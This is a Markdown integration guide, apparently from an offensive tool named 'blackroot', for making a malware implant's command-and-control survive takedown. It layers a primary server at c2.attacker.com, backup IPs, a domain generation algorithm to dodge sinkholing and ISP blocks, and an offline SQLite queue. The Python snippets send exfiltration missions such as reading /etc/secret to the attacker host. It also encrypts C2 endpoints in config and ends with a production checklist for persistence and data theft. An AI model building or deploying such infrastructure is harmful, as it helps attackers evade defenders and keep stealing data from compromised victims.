"""
C2_RESILIENCE_COMPLETE_INTEGRATION.md - End-to-End C2 Resilience Guide
========================================================================

This guide shows the complete C2 resilience infrastructure and how to integrate
it into your agent for guaranteed offline resilience.

**Problem**: Single primary C2 creates single point of failure.
If primary is sinkholed/blocked, agent goes dormant.

**Solution**: Multi-tier fallback with local offline persistence.
Primary > Backups > DGA Domains > Offline Queue

Agent NEVER gets stuck offline. Even during complete C2 outage, missions are
queued locally and automatically execute when connectivity returns.

---

## Architecture: 4-Layer Resilience

┌─────────────────────────────────────────────────────────────────┐
│ LAYER 1: PRIMARY C2 (Default, Fastest)                          │
│ ───────────────────────────────────────────────────────────────┤
│ - Endpoint: https://c2.attacker.com:8443                       │
│ - Role: Primary exfil, mission receipt, agent registration     │
│ - Failure Handling: 1-2 retries, then fallback to LAYER 2      │
└─┬───────────────────────────────────────────────────────────────┘
  │ Primary online?
  ├─ YES → Execute mission immediately
  └─ NO (timeout, DNS fail, TLS error) → Try LAYER 2

┌──────────────────────────────────────────────────────────────────┐
│ LAYER 2: BACKUP IPs (Fallback, Slower)                           │
│ ──────────────────────────────────────────────────────────────────│
│ - IPs: [10.0.0.5:8443, 203.0.113.42:443, 192.0.2.1:8443]        │
│ - Role: Redundant C2, alternate network paths                    │
│ - Encryption: Both encrypted in config with StringEncryptor     │
│ - Failure Handling: Cycle through list, exponential backoff      │
│   (1s, 2s, 4s, 8s... up to 1h for transient failures)          │
└─┬──────────────────────────────────────────────────────────────────┘
  │ All backups online?
  ├─ YES → Execute via next healthy backup
  └─ NO (all tried, all failed) → Try LAYER 3

┌──────────────────────────────────────────────────────────────────┐
│ LAYER 3: DGA DOMAINS (Dynamic, Unblockable)                     │
│ ──────────────────────────────────────────────────────────────────│
│ - Generator: DGAGenerator (seed="prod_seed_2026")                │
│ - Domains: 50/day, rotated (MATH_BASED, TLDCYCLE, WORD_BASED)  │
│ - Pool: DGADomainPool maintains cache + per-domain failures     │
│ - Per-Domain Tracking:                                           │
│   * Failures tracked individually (not bulk depletion)          │
│   * Failed domains retry after exponential backoff               │
│   * Role: Survive sinkholing + ISP blocking                     │
│ - Failure Handling: Rotate through pool, skip failed domains    │
└─┬──────────────────────────────────────────────────────────────────┘
  │ Any DGA domain available?
  ├─ YES → Execute via next healthy DGA domain from pool
  └─ NO (all 50 exhausted or blacklisted) → Try LAYER 4

┌──────────────────────────────────────────────────────────────────┐
│ LAYER 4: OFFLINE QUEUE (Local Persistence)                      │
│ ──────────────────────────────────────────────────────────────────│
│ - Storage: SQLite DB (~/.blackroot_queue.db)                    │
│ - Purpose: Queue missions during complete C2 outage             │
│ - Behavior:                                                      │
│   * Enqueue missions when no C2 available                        │
│   * Persist across agent restarts (crash/reboot safe)           │
│   * Auto-flush when C2 comes online                             │
│   * Local exfil continues (can still gather data)               │
│ - Schema:                                                        │
│   missions(id, mission_type, payload, timestamp, status, ...)  │
│ - Status tracking: PENDING, QUEUED_OFFLINE, IN_PROGRESS,       │
│   COMPLETED, FAILED_TRANSIENT, FAILED_PERMANENT                │
└──────────────────────────────────────────────────────────────────┘

Result: Agent continues operating normally even if:
✓ Primary C2 sinkholed
✓ All backup IPs blocked
✓ ISP filters all DGA domains
✓ Complete network outage

---

## Component Overview

### 1. C2ResilienceOrchestrator (Main Coordinator)

**Purpose**: Orchestrates all layers, decides which C2 to try

**Key Methods**:

- `get_next_c2()` → Returns next C2 endpoint to try (Layer 1 > 2 > 3 > 4)
- `execute_mission(mission_id, mission_type, payload, execute_func)`
  Tries execute_func with orchestrator-selected C2
  If fails → queues offline
  If succeeds → clears from queue, reports success
  
- `flush_offline_queue(execute_func)` → On reconnection, execute queued missions
- `register_connectivity_callback(func)` → Callback when online/offline
- `get_status()` → Return health stats for operator visibility

**Integration Pattern**:

```python
orchestrator = C2ResilienceOrchestrator(
    primary_c2="https://c2.attacker.com:8443",
    backup_ips=["10.0.0.5:8443", "203.0.113.42:443"],
    dga_generator=dga,
    logger=agent_logger
)

# Execute mission with auto-fallback
def execute_via_http(c2, mission_type, payload):
    response = http_client.post(c2 + "/execute", json={...})
    return response.status_code == 200

success = orchestrator.execute_mission(
    mission_id="EXFIL_001",
    mission_type="EXFIL",
    payload={"files": ["/etc/secret"]},
    execute_func=execute_via_http
)

if not success:
    # Mission queued offline, will retry when online
    pass
```

### 2. C2FallbackResolver (Primary + Backups)

**Purpose**: Manages primary + backup IPs with exponential backoff

**Features**:

- Health tracking per endpoint (primary + N backups)
- Exponential backoff for transient failures (DNS timeout, HTTP 503)
- 24-hour blacklist for permanent failures (HTTP 403, TLS error)
- Persistent state (survives agent restart)
- Distinguishes transient vs permanent failures

**Integration with Orchestrator**:

- Orchestrator calls `fallback_resolver.get_next_c2()` first
- If returns IP endpoint: use it (Layer 1/2)
- If returns None: try DGA pool (Layer 3)

**Usage**:

```python
from c2_fallback_resolver import C2FallbackResolver, FailureReason

resolver = C2FallbackResolver(
    primary_c2="https://c2.attacker.com:8443",
    backup_ips=["10.0.0.5:8443", "203.0.113.42:443"]
)

# Before executing mission
c2 = resolver.get_next_c2()  # Returns primary if healthy, else backup

# After execution
if response.status_code == 200:
    resolver.report_success(c2)
else:
    resolver.report_failure(c2, FailureReason.HTTP_500)
    # Next call to get_next_c2() will skip failed endpoint
```

### 3. DGADomainPool (Dynamic Domain Generation)

**Purpose**: Cashed pool of 50 domains/day with per-domain failure tracking

**Key Innovation**: Unlike simpler DGA implementations that deplete domains
immediately, this maintains a rotating pool:

```
Traditional DGA:
- Generate 50 domains
- Try domain[0], fails → try domain[1], fails → ...domain[50] fails
- After 50 tries, no domains left (stuck)
Problem: Cache depletes, agent stuck

New Approach (DGADomainPool):
- Maintain pool of 50 domains
- Track failures PER DOMAIN (not bulk)
- Rotate through pool (circular): domain[0] → domain[49] → domain[0]
- Failed domains skip with exponential backoff
- After backoff expires, domain retried again
Example: 40 domains blacklisted, pool cycles through 10 available ones
Result: Agent survives even if majority of domains blocked
```

**Per-Domain Tracking**:

- Each domain has failure count + backoff timer
- Failed domain skipped for `backoff = 2^count * 1s` (capped at 1h)
- Even if 1/50 domains unblocked, agent succeeds (if tried enough)

**Integration**:

```python
pool = DGADomainPool(dga_generator=dga)

# Get next domain (skips failed ones)
domain = pool.get_next_domain()

# Execute via domain
success = execute_via_http(domain, mission_type, payload)

if success:
    pool.report_domain_success(domain)
else:
    pool.report_domain_failure(domain, reason="TIMEOUT")
    # Next call gets different domain
```

### 4. OfflineMissionQueue (Local Persistence)

**Purpose**: Queue missions during complete C2 outage, auto-flush on recovery

**Design**:

- SQLite database (portable, no dependencies)
- Transactions (crash-safe)
- Status tracking (pending, completed, failed)
- Retry counting (know when to give up)

**Schema**:

```sql
CREATE TABLE missions (
    id PRIMARY KEY,             -- "EXFIL_001"
    mission_type TEXT,          -- "EXFIL", "LATERAL", "PERSIST"
    payload TEXT,               -- JSON-encoded payload
    timestamp REAL,             -- When queued
    status TEXT,                -- "PENDING", "QUEUED_OFFLINE", "COMPLETED"
    retry_count INTEGER         -- How many times retried
)
```

**Usage**:

```python
queue = OfflineMissionQueue(db_path="~/.blackroot_queue.db")

# Enqueue mission during outage
queue.enqueue("EXFIL_001", "EXFIL", {"files": [...]})

# Get pending missions for flush
pending = queue.get_pending_missions(limit=10)

# Mark as executed
queue.mark_completed("EXFIL_001")
queue.mark_failed("EXFIL_002", transient=True)  # Retry
```

---

## Failure Scenario Resolution

### Scenario 1: Primary Sinkholed (Instant Recovery)

```
Timeline:
T+0s:    Agent tries primary C2
T+2s:    DNS timeout (sinkholed domain)
T+2s:    fallback_resolver.report_failure(primary, DNS_FAILED)
T+2s:    Next mission tries backup_ip[0]
T+5s:    Backup IP responds successfully
Result:  3-5s latency, mission executes
```

**Agent Code**:

```python
c2 = orchestrator.get_next_c2()
# Returns https://c2.attacker.com:8443 (primary, OK)

# DNS fails, retry
c2 = orchestrator.get_next_c2()
# Returns 10.0.0.5:8443 (backup, OK)
```

### Scenario 2: All Free IPs Blocked (DGA Recovery)

```
Timeline:
T+0s:    Primary fails (firewall block)
T+15s:   Backup[0] fails (ISP filter)
T+30s:   Backup[1] fails (firewall block)
T+30s:   All static IPs exhausted
T+30s:   fallback_resolver returns None
T+30s:   DGA pool provides domain (daily-generated)
T+35s:   DGA domain resolves, mission executes
Result:  ~35s outage, agent recovers via dynamic domain
```

**Agent Code**:

```python
# First 3 tries fail
c2 = orchestrator.get_next_c2()
# Returns primary → fails
# Returns backup[0] → fails
# Returns backup[1] → fails
# All static IPs exhausted

# 4th try: DGA domain
c2 = orchestrator.get_next_c2()
# Returns dga_domain_23.com (from daily pool)
# Executes successfully
```

### Scenario 3: Complete C2 Outage (Offline Queue)

```
Timeline:
T+0s:    Primary blocked
T+15s:   All backups blocked
T+30s:   All DGA domains sinkholed
T+30s:   No C2 available
T+30s:   Missions queued to offline queue
T+30s:   Agent enters offline mode
T+...    Agent continues local operations (gather data, maintain persistence)
T+48h:   C2 comes back online
T+48h:   Agent detects online
T+48h:   Offline queue auto-flushes
T+48h:   All queued missions execute
Result:  48h of queued operations, zero data loss
```

**Agent Code**:

```python
# All C2 layers exhausted
c2 = orchestrator.get_next_c2()
# Returns None (all layers failed)

# Mission auto-queues
success = orchestrator.execute_mission(mission_id, type, payload, execute_func)
# Returns False, mission queued to SQLite

# Later, operator brings C2 back online
# Agent detects connectivity
def on_connectivity_change(is_online):
    if is_online:
        # Flush queue
        orchestrator.flush_offline_queue(execute_func)
        # All missions execute

orchestrator.register_connectivity_callback(on_connectivity_change)
```

---

## Integration Checklist

### Step 1: Setup in agents/base.py

```python
# In BaseAgent.__init__():
from config_encryptor import ConfigEncryptor
from c2_dga_generator import create_dga_from_config
from c2_resilience_orchestrator import C2ResilienceOrchestrator

self.cfg = ConfigEncryptor()
self.cfg.load_config_from_env()

self.dga = create_dga_from_config(self.cfg)

self.orchestrator = C2ResilienceOrchestrator(
    primary_c2=self.cfg.get("c2.endpoint"),
    backup_ips=self.cfg.get("c2.backup_ips", []),
    dga_generator=self.dga,
    logger=self.logger,
    state_file=self.cfg.get("c2.state_file", "~/.blackroot_c2_state"),
    queue_db=self.cfg.get("c2.queue_db", "~/.blackroot_queue.db"),
)
```

### Step 2: Mission Execution

```python
# In execute_mission():
def execute_via_c2(c2_endpoint, mission_type, payload):
    # Your C2 HTTP client
    response = self.http_client.post(
        c2_endpoint + "/api/v1/execute",
        json={"type": mission_type, "payload": payload},
        timeout=30
    )
    return response.status_code == 200

success = self.orchestrator.execute_mission(
    mission_id=mission.get("id"),
    mission_type=mission.get("type"),
    payload=mission.get("payload"),
    execute_func=execute_via_c2
)
```

### Step 3: Queue Recovery (Optional)

```python
# On periodic timer (e.g., every 5 minutes):
def periodic_queue_flush(self):
    status = self.orchestrator.get_status()
    if status["online"] and status["queue_depth"] > 0:
        self.orchestrator.flush_offline_queue(self.execute_via_c2)
        self.logger.info("Flushed {} queued missions".format(...))
```

### Step 4: Status Reporting (Optional)

```python
# Periodically report to operator:
def report_status(self):
    status = self.orchestrator.get_status()
    self.http_client.post(
        self.cfg.get("c2.endpoint") + "/api/agent/status",
        json={
            "agent_id": self.agent_id,
            "resilience_status": status,
        }
    )
```

---

## Config Keys Required

Add these to config.json (encrypted):

```json
{
  "encrypted_strings": {
    "c2.endpoint": "...",              // Primary C2 (encrypted)
    "c2.backup_ips": "[ip1,ip2,...]",  // Backups list (encrypted)
    "dga.seed": "...",                 // DGA seed (encrypted)
  },
  "dga.algorithm": "TLDCYCLE",         // Algorithm (not encrypted)
  "c2.state_file": "~/.blackroot_c2_state",  // Resolver state
  "c2.queue_db": "~/.blackroot_queue.db",    // Mission queue
}
```

---

## Testing & Validation

```python
# Test 1: All layers work together
from c2_resilience_orchestrator import C2ResilienceOrchestrator
from c2_dga_generator import DGAGenerator

dga = DGAGenerator(seed="test")
orch = C2ResilienceOrchestrator(
    primary_c2="primary.com",
    backup_ips=["backup.com"],
    dga_generator=dga
)

# Test 2: Simulate primary failure
from c2_fallback_resolver import FailureReason
orch.fallback_resolver.report_failure("primary.com", FailureReason.TIMEOUT)
assert orch.get_next_c2() == "backup.com"  # Falls back

# Test 3: Simulate all static IPs fail
orch.fallback_resolver.report_failure("backup.com", FailureReason.TIMEOUT)
c2 = orch.get_next_c2()
assert c2 is not None  # Should return DGA domain
assert c2.endswith((".com", ".net", ".org", ".io", ".xyz"))

# Test 4: Complete outage queues locally
success = orch.execute_mission("M1", "type", {}, lambda *a: False)
assert not success  # Fails
assert orch.mission_queue.queue_size() == 1  # Queued

print("[+] All integration tests passed!")
```

---

## Production Checklist

- [ ] All C2 endpoints encrypted in config (StringEncryptor)
- [ ] DGA seed encrypted in config (StringEncryptor)
- [ ] C2ResilienceOrchestrator initialized in BaseAgent.__init__()
- [ ] execute_mission() uses orchestrator (not direct C2 call)
- [ ] Offline queue database exists and is readable
- [ ] State file persisted to disk
- [ ] Status reporting to C2 API (for operator visibility)
- [ ] 10+ agent test with all layers active
- [ ] Verified: agent survives 24h+ C2 outage
- [ ] Verified: offline missions flush when online
- [ ] Verified: DGA domains not blocked (at least 1/50 succeeds)

---

## Summary: Agent Never Gets Offline

With this 4-layer architecture:

1. PRIMARY: Fast, direct C2
2. BACKUPS: Alternate routes, exponential backoff
3. DGA: Dynamic domains, per-domain failure tracking
4. OFFLINE: Local queue, auto-flush on recovery

**Even if all layers fail**, missions are queued locally and execute when
connectivity returns. Zero data loss, zero operator intervention required.

Agent continues gathering intelligence, maintaining persistence, and queuing
exfiltration even during prolonged C2 outage.
"""
